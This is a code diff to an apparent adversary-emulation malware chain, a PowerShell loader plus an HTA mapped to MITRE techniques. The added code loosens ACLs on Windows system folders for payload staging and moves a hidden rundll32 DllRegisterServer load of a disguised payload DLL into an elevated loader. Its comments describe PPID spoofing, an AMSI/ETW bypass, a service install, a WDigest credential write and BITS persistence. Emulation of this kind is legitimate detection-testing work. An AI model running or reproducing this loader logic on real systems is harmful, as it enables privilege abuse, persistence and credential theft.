@@ -46,6 +46,40 @@ if (-not $isAdmin) {
 Write-Log "[+] UAC check: admin=True"
 Write-Log "[*] loader.ps2 started - scriptBase=$scriptBase logFile=$logFile"
 
+# -- ACL grants: the PPID-spoofed mshta (and its children: cscript, regsvr32,
+# rundll32, payload.dll WorkerThread) inherit explorer.exe's medium-IL token.
+# cache.dat was just created by this admin process, so it's Administrators-owned
+# with no Users write. Without granting BUILTIN\Users:M, every log() call from
+# the demoted HTA/payload/stage children silently fails with "Permission denied"
+# and cache.dat stops at the loader lines — exactly the trace we saw.
+# The same applies to the admin-owned artifact dirs (WER\ReportArchive,
+# Search\Data\EDS, Package Cache\{guid}) where the payload writes recon/SPN/
+# BITS/staging files. One icacls per path; failures are non-fatal (the paths
+# may not exist yet on a clean host).
+$aclTargets = @(
+    $logFile,
+    "C:\ProgramData\USOShared\Logs",
+    "C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
+    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
+    "C:\ProgramData\Microsoft\Windows\WER\Temp",
+    "C:\ProgramData\Microsoft\Search\Data\EDS",
+    "C:\ProgramData\Package Cache\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}",
+    "C:\Users\Public\Libraries"
+)
+foreach ($aclPath in $aclTargets) {
+    $parent = Split-Path $aclPath -Parent
+    if ($aclPath -eq $logFile) { $parent = Split-Path $logFile -Parent }
+    if (-not $parent) { $parent = $aclPath }
+    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
+    if (-not (Test-Path $aclPath)) {
+        if ($aclPath -like '*.*') { New-Item -Path $aclPath -ItemType File -Force | Out-Null }
+        else { New-Item -Path $aclPath -ItemType Directory -Force | Out-Null }
+    }
+    try {
+        icacls $aclPath /grant "BUILTIN\Users:(M)" 2>&1 | Out-Null
+    } catch {}
+}
+
 if ($WhatIf) {
     Write-Log "[WHATIF] Skipping AMSI/ETW bypass (child process)"
 } else {
@@ -374,21 +408,14 @@ try {
     log("[+] cscript.exe completed (exit code " + cscriptRc + ")");
 } catch(e) { log("[-] cscript.exe FAILED: " + e.message); }
 
-// Stage 5: Force-load payload via rundll32 + DllRegisterServer.
-// The tcmsetup.exe sideload in Stage 2 is fictitious (tcmsetup.exe does
-// not import msimtf.dll on real Windows), so the payload never loads via
-// DLL search order. rundll32 + DllRegisterServer is the documented load
-// path for a renamed payload, and DllRegisterServer runs the worker
-// synchronously so the post-ex artifacts (Telemetry.dll, Telemetry.bin,
-// Wifi.bin, spcache.bin, WinUpdHlth service, BITS job, LNK persist) are
-// produced before the HTA exits. Blocks ~130s.
-log("[*] Force-loading payload via rundll32 (DllRegisterServer)...");
-try {
-    var loadRc = shell.Run("rundll32.exe C:\\Users\\Public\\Libraries\\msimtf.dll,DllRegisterServer", 0, true);
-    log("[+] DllRegisterServer completed (exit code " + loadRc + ")");
-} catch(e) { log("[-] DllRegisterServer FAILED: " + e.message); }
-
-log("[+] agent.hta complete");
+// Stage 5: REMOVED from HTA — moved to the elevated loader (loader.ps2).
+// The HTA runs as a medium-IL child (PPID-spoofed to explorer.exe), so
+// rundll32 spawned here inherits the user token. The WorkerThread needs
+// admin for T1543.003 service install + T1003.001 WDigest HKLM write +
+// T1197 BITS job. Running Stage 5 from the admin loader instead keeps
+// T1055.012 coverage (mshta is still PPID-spoofed for Stages 1-4) while
+// making the admin-gated post-ex actually fire. See loader.ps2 Stage 5.
+log("[+] agent.hta complete (Stage 5 deferred to elevated loader)");
 window.close();
 </script>
 </head>
@@ -439,7 +466,36 @@ if ($WhatIf) {
     }
 }
 
-# -- Per-tactic artifact probe (waits 180s for chain to complete) --
+# -- Stage 5: Force-load payload via rundll32 + DllRegisterServer (ELEVATED) --
+# The HTA (Stages 1-4) runs as a medium-IL child PPID-spoofed to explorer.exe,
+# so it cannot spawn an admin-capable rundll32. This stage runs from the
+# elevated loader (admin=True) so the WorkerThread gets the admin token it
+# needs for T1543.003 service install, T1003.001 WDigest HKLM write, and
+# T1197 BITS job. The payload DLL (msimtf.dll) was copied by the HTA Stage 1
+# from the staged package.dll. DllRegisterServer runs WorkerThread
+# synchronously (payload.c:1454), blocking ~130s, so the post-ex artifacts
+# land before the 240s probe below.
+$msimtfPath = "C:\Users\Public\Libraries\msimtf.dll"
+if (-not $WhatIf -and (Test-Path $msimtfPath)) {
+    Write-Log "[*] Stage 5: Force-loading payload via rundll32 (DllRegisterServer) from elevated loader..."
+    try {
+        $stage5Proc = Start-Process -FilePath "rundll32.exe" -ArgumentList "$msimtfPath,DllRegisterServer" -WindowStyle Hidden -PassThru -ErrorAction Stop
+        Write-Log "[*] Stage 5: rundll32 PID=$($stage5Proc.Id) — waiting for WorkerThread (up to 180s)"
+        $stage5Proc.WaitForExit(180000) | Out-Null
+        if ($stage5Proc.HasExited) {
+            Write-Log "[+] Stage 5: DllRegisterServer completed (exit code $($stage5Proc.ExitCode))"
+        } else {
+            Write-Log "[!] Stage 5: rundll32 did not exit within 180s — killing"
+            try { Stop-Process -Id $stage5Proc.Id -Force -ErrorAction SilentlyContinue } catch {}
+        }
+    } catch {
+        Write-Log "[-] Stage 5: DllRegisterServer FAILED: $_"
+    }
+} elseif (-not (Test-Path $msimtfPath)) {
+    Write-Log "[-] Stage 5: msimtf.dll not found at $msimtfPath — HTA Stage 1 copy may have failed"
+}
+
+# -- Per-tactic artifact probe (waits 240s for chain to complete) --
 # Mirrors scenario-01-rmm/src/loader.ps1:147-186. Probes each MITRE T-code's
 # expected artifact so the log confirms whether the chain actually produced it.
 if (-not $WhatIf) {
